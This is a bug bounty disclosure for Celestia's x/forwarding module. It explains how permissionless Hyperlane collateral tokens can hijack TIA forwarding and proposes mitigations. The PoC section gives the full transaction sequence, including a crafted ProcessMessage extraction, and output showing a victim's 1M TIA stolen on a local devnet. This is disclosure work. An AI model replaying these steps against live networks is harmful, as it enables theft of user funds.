 
# Bounty Program: CELESTIA

## Report: Permissionless TIA theft via collateral token poisoning in Forwarding Module

## Created March 11, 2026, 13:07

## Vulnerability details:
## Summary

Celestia's `x/forwarding` module makes an unsafe trust decision by treating the Hyperlane warp token registry as an authoritative source for native TIA routing, without validating token ownership or legitimacy. The module's `findTIACollateralTokenForDomain` performs an O(n) scan of all warp tokens and returns the **first** match with an enrolled router for the target domain. Since the Hyperlane warp token registry is permissionless (any account can create collateral tokens with `OriginDenom = "utia"`), an attacker can poison this lookup by registering their own token, mailbox, and ISM infrastructure. The forwarding module then routes the victim's TIA through the attacker's token, and the attacker extracts it via a crafted `ProcessMessage` call verified by a NoopISM they control.

The exploit reproduces on a private local devnet using a clean build from the same source commit tagged for Mocha `v7.0.2` (`3c528a42`), which matches the version reported by Mocha production. The PoC steals a victim's entire 1,000,000 TIA deposit using 3 unprivileged accounts with zero mocks, real consensus, and real state transitions. All 10 transactions are logged with their tx hashes.

## Root Cause

The core vulnerability is in Celestia's `x/forwarding` module, which treats the Hyperlane warp token registry as a trusted source for routing native TIA, without validating token ownership or legitimacy.

### Primary: Unsafe Trust Boundary in `x/forwarding` (Celestia)

**1. Unvalidated first-match token selection.** [`findTokenWithRoute`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/x/forwarding/keeper/keeper.go#L66-L87) iterates all warp tokens in ascending `uint64` key order and returns the **first** match with an enrolled router. [`findTIACollateralTokenForDomain`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/x/forwarding/keeper/keeper.go#L90-L105) filters only by `OriginDenom == "utia"` and `TokenType == COLLATERAL`. No allowlist, no governance gate, no validation that the token belongs to a legitimate operator.

**2. `MsgForward` commits user funds to the unvalidated token.** [`forwardSingleToken`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/x/forwarding/keeper/msg_server.go#L101-L198) calls `RemoteTransferCollateral`, which escrows the victim's TIA in the warp module account, credits the attacker's token's `CollateralBalance`, and dispatches via the attacker's zero-fee mailbox. The transaction returns success with no indication of theft.

### Contributing: Permissionless Hyperlane Primitives

The Hyperlane integration exposes permissionless primitives that the attacker uses to construct malicious infrastructure. These are not bugs in Hyperlane, but `x/forwarding` fails to account for the trust implications of consuming a permissionless registry:

| Component | Auth Required |
|-----------|--------------|
| NoopISM, NoopHook, Mailbox | None |
| [`CollateralToken`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/msg_server.go#L61-L104) | None (no uniqueness check on OriginDenom) |
| RemoteRouter | Token owner only |

Both token types are enabled on Celestia ([`app.go:414`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/app/app.go#L414)). The extraction phase uses [`NoopISM`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/core/01_interchain_security/types/ism_noop.go#L19-L21) (always returns `true`) via [`ProcessMessage`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/core/keeper/logic_message.go#L17-L96) to call [`Handle`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/keeper.go#L106-L158) and [`RemoteReceiveCollateral`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/logic_collateral.go#L90-L114), releasing TIA from the shared warp module account. Per-token `CollateralBalance` limits withdrawals to what was deposited under each token, but the forwarding module already routed the victim's TIA through the attacker's token. See Appendix C in comments for full vulnerable code excerpts.

## Attack Scenario

**Setup (one-time, gas only, 7 transactions):** Attacker creates NoopISM, 2 NoopHooks, Mailbox (with NoopISM as default), CollateralToken (`OriginDenom="utia"`), and enrolls routers for target domains. All permissionless.

**Interception (triggered by any relayer):** User deposits TIA to a forwarding address. Relayer calls `MsgForward`. `findTIACollateralTokenForDomain` returns attacker's token (first match or only route). `RemoteTransferCollateral` escrows TIA in the warp module, credits the attacker's token's `CollateralBalance`, dispatches via attacker's zero-fee mailbox. Returns **success** with no indication of theft.

**Extraction (attacker-initiated):** Attacker crafts a HyperlaneMessage (origin/sender matching enrolled router, recipient = attacker's token, body = attacker address + amount). Submits `MsgProcessMessage`. NoopISM verifies. `RemoteReceiveCollateral` sends TIA to attacker.

**Result: TIA permanently stolen from forwarding users.** See Appendix E in comments for the full step-by-step attack flow with exact message types.

## Attack Viability

**New domains (highest impact):** Attacker pre-registers tokens for domains without legitimate bridges. When bridges are later established, the attacker's token may have a lower ID (shared sequence counter) or be the only match. All forwarded TIA goes through the attacker's token.

**Existing domains:** If the attacker created their token before the legitimate one (e.g., during the v7 upgrade window), their token is always selected first for any domain where both have enrolled routers.

## Deployment Status

`Hibiscus` (`v7`) is the official upcoming Celestia upgrade, with `CIP-45: Forwarding Module` as a key feature. Deployed on Arabica (`v7.0.2-arabica`) and Mocha (`v7.0.2`) with the vulnerable code path reachable (see Appendix A). Mainnet Beta runs `v6.4.10` (forwarding not yet active, upgrade date TBD).

Mainnet Beta already has 10 `utia` collateral tokens (3 non-official). Domains `714` and `984122` would already resolve to non-official tokens under current `findTokenWithRoute` logic (see Appendix B).

## Impact

- **Direct fund theft**: All TIA forwarded to poisoned domains is stolen and unrecoverable
- **Silent**: Forwarding transaction succeeds normally; neither user nor relayer sees theft
- **Scalable**: One setup covers unlimited victims across multiple domains
- **Low cost**: Setup costs only gas; extraction is pure profit
- **Permissionless**: No governance, validator keys, or special roles required

## Recommended Mitigation

**Option A (Recommended): Trusted Token Registry.** Add a governance-controlled allowlist of authorized collateral tokens per denom in the forwarding module. Only registered tokens can be selected by `findTIACollateralTokenForDomain`.

**Option B: Restrict Collateral Token Creation.** Require the governance `authority` to create collateral tokens (add `msg.Owner != k.authority` check in `CreateCollateralToken`).

**Option C: Explicit Token ID in Forwarding.** Store the specific token ID per (denom, domain) pair in forwarding state, set by governance. Eliminates the ambiguous first-match scan entirely.

**Option D: Restrict NoopISM (partial).** Prevent NoopISM from being used as DefaultIsm for mailboxes backing collateral tokens. Blocks extraction but not interception.

## References

All links pinned to specific commits for permanent verification.

**celestia-app** ([`3c528a42`](https://github.com/celestiaorg/celestia-app/tree/3c528a42424b01575333f83f11ed5754149c1b67), `v7.0.2-mocha`):
[`keeper.go:66-87`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/x/forwarding/keeper/keeper.go#L66-L87) findTokenWithRoute |
[`keeper.go:90-105`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/x/forwarding/keeper/keeper.go#L90-L105) findTIACollateralTokenForDomain |
[`msg_server.go:101-198`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/x/forwarding/keeper/msg_server.go#L101-L198) forwardSingleToken |
[`warp_adapter.go:63-80`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/x/forwarding/keeper/warp_adapter.go#L63-L80) GetAllHypTokens |
[`app.go:414`](https://github.com/celestiaorg/celestia-app/blob/3c528a42424b01575333f83f11ed5754149c1b67/app/app.go#L414) token types enabled

**hyperlane-cosmos** ([`v1.1.0`](https://github.com/bcp-innovations/hyperlane-cosmos/tree/v1.1.0)):
[`msg_server.go:61-104`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/msg_server.go#L61-L104) CreateCollateralToken |
[`logic_collateral.go:17-86`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/logic_collateral.go#L17-L86) RemoteTransferCollateral |
[`logic_collateral.go:90-114`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/logic_collateral.go#L90-L114) RemoteReceiveCollateral |
[`keeper.go:106-158`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/keeper.go#L106-L158) Handle |
[`keeper.go:89-104`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/warp/keeper/keeper.go#L89-L104) ReceiverIsmId |
[`logic_message.go:17-96`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/core/keeper/logic_message.go#L17-L96) ProcessMessage |
[`ism_noop.go:19-21`](https://github.com/bcp-innovations/hyperlane-cosmos/blob/v1.1.0/x/core/01_interchain_security/types/ism_noop.go#L19-L21) NoopISM.Verify

## Validation steps:
## Proof of Concept

The PoC is provided as an attached zip: `run-attack.zip` (contains `run-attack.sh`)

### What It Is

A self-contained bash script that starts a real `celestia-appd v7.0.2` single-node chain (built from the same source commit tagged for Mocha `v7.0.2`, which matches the version reported by Mocha production), executes the complete attack end-to-end, verifies theft, and prints a full tx hash ledger. Zero mocks, real consensus, real state transitions.

### Prerequisites

1. Clone `celestia-app` and check out tag `v7.0.2-mocha`
2. Run `make build` to produce `./build/celestia-appd`
3. Verify: `./build/celestia-appd version` prints `7.0.2`

### How to Run

```bash
bash poc/collateral-poisoning/run-attack.sh
```

The script is fully automated. It takes approximately 60 seconds.

### Step-by-Step Walkthrough

The script executes the following phases:

**Phase 0 - Chain Initialization:**
1. Creates a temporary home directory and initializes a single-validator chain
2. Creates 4 accounts: `validator`, `attacker` (10B utia), `victim` (2T utia), `relayer` (10B utia)
3. Starts the node with CometBFT consensus and waits for block production

**Phase 1 - Attacker Creates Malicious Infrastructure (7 transactions):**
1. `tx hyperlane ism create-noop` - Creates a NoopISM (always returns `verified=true`)
2. `tx hyperlane hooks noop create` - Creates NoopHook #1 (required hook, zero-fee dispatch)
3. `tx hyperlane hooks noop create` - Creates NoopHook #2 (default hook, zero-fee dispatch)
4. `tx hyperlane mailbox create <ismId> 99999` - Creates a mailbox with NoopISM as default ISM and local domain 99999
5. `tx hyperlane mailbox set <mailboxId> --default-hook <hook2> --required-hook <hook1>` - Assigns NoopHooks to the mailbox
6. `tx warp create-collateral-token <mailboxId> utia` - Creates a collateral token with `OriginDenom="utia"` under the attacker's mailbox
7. `tx warp enroll-remote-router <tokenId> 7777 0x...dead 0` - Enrolls a router for target domain 7777

**Phase 2 - Victim Deposits TIA:**
1. Derives the forwarding address for domain 7777 using `q forwarding derive-address`
2. Records the attacker's balance (9,999,853,000 utia after setup gas)
3. Victim sends 1,000,000,000,000 utia (1M TIA) to the forwarding address via `tx bank send`
4. Verifies the forwarding address holds the deposit

**Phase 3 - Relayer Triggers Forwarding (Victim's TIA Routed Through Attacker's Token):**
1. Relayer calls `tx forwarding forward <fwdAddr> 7777 <recipient> --max-igp-fee 0utia`
2. The script verifies the `hyperlane.warp.v1.EventSendRemoteTransfer` event shows `token_id` matching the attacker's token (NOT a legitimate token)
3. Verifies the warp module account now holds 1,000,000,000,000 utia (the victim's entire deposit)
4. Verifies the forwarding address is drained to 0

**Phase 4 - Attacker Extracts Stolen TIA:**
1. Converts the attacker's cosmos address to hex bytes
2. Constructs a raw HyperlaneMessage: Version=3, Nonce=0, Origin=7777, Sender=0x...dead (matching enrolled router), Destination=99999, Recipient=attacker's token ID, Body=WarpPayload(attacker address, 1T utia)
3. Submits `tx hyperlane mailbox process <mailboxId> 0x <craftedMsg>` - NoopISM verifies (always true), `Handle` calls `RemoteReceiveCollateral` which sends TIA to attacker
4. Verifies `ProcessMessage` succeeded (code=0)

**Phase 5 - Verification:**
1. Queries final balances for attacker, victim, and warp module
2. Computes attacker net profit: `bal_after - bal_before`
3. Asserts profit > 0 and prints full breakdown

### Verbatim Output

Run on 2026-03-11 using `celestia-appd v7.0.2` built from commit `3c528a42` (tagged `v7.0.2-mocha` and `v7.0.2-arabica`):

```
PHASE 1: Attacker creates malicious infrastructure
  [OK] NoopISM: 0x726f757465725f69736d00000000000000000000000000000000000000000000
  [OK] NoopHook #1: 0x726f757465725f706f73745f6469737061746368000000000000000000000000
  [OK] NoopHook #2: 0x726f757465725f706f73745f6469737061746368000000000000000000000001
  [OK] Mailbox: 0x68797065726c616e650000000000000000000000000000000000000000000000
  [OK] Hooks set
  [OK] Token: 0x726f757465725f61707000000000000000000000000000010000000000000000
  [OK] Router enrolled

PHASE 2: Victim deposits TIA to forwarding address
  Attacker balance before: 9999853000 utia
  [OK] Deposit confirmed
  [OK] Forwarding address balance: 1000000000000 utia

PHASE 3: Relayer triggers forwarding (routed through attacker's token)
  [OK] MsgForward tx included (code=0)
  [OK] Token used for forward: 0x726f757465725f61707000000000000000000000000000010000000000000000
  [OK] CONFIRMED: Forwarding routed through ATTACKER's token!
  [OK] Warp module holds: 1000000000000 utia (from victim's deposit)
  [OK] Amount forwarded through attacker's token: 1000000000000 utia
  [OK] Forwarding address drained: 0 utia remaining

PHASE 4: Attacker extracts stolen TIA via ProcessMessage
  [OK] ProcessMessage SUCCEEDED - TIA sent to attacker!

PHASE 5: Verification
  Victim deposited:       1000000000000 utia (1000000 TIA)
  Victim lost:            1000000000000 utia (full deposit)
  Attacker bal BEFORE:    9999853000 utia
  Attacker bal AFTER:     1009999832000 utia
  ATTACKER NET PROFIT:    999999979000 utia (999999 TIA, after gas)
  Warp module final bal:  0 utia (drained)

TX HASH LEDGER
  1. CreateNoopISM                    35A464603FAE89EF9A46CA8C16BBAAC5F6334E15EB1B4AFE01519F043AAEB7F2
  2. CreateNoopHook(required)         0543ADDF14808F921F0C9AA249EBF2ABE4F9BA1FC00FCC9AF9FDE0ED8063C6DF
  3. CreateNoopHook(default)          065D0BE224B96FAAB1DA12FDC094DBDF27A17B66A1D5E5C23A82FC1B36088EFE
  4. CreateMailbox                    0E2003AD636C15317ADC4804FB76B23E9D490CA8CDF3238FD833A43A709A5684
  5. SetMailboxHooks                  478CAFF4C184B6DFB11E995919F87B1DFF326F845677FA3AD4E029C769C1E7A1
  6. CreateCollateralToken            DB62BAF72BC71061035BE372BDBB32C869186FA0D0953410AD221676BFCB2B03
  7. EnrollRemoteRouter               76CD83E92B3297A4830FD495151748691CA8DD0976F62E9E5476D8AC4E9D931F
  8. VictimDeposit                    9964CF70617A4EA6B2AE9236C2AE46D5DE240BCA8BABDC66D5AD394A8E701146
  9. MsgForward(interception)         2D7A6B74C3DFC49C9419FA8E3A7F5FF77941EAA720187F707938EDF05DB8B465
  10. ProcessMessage(extraction)      F1892E40D2FEF9C26AEB4CBC1EEB3679943635BEB9EA46F77FEF006C420DAAD7

ATTACK SUCCESSFUL: 1000000000000 utia stolen (attacker net profit: 999999979000 utia after gas)
```

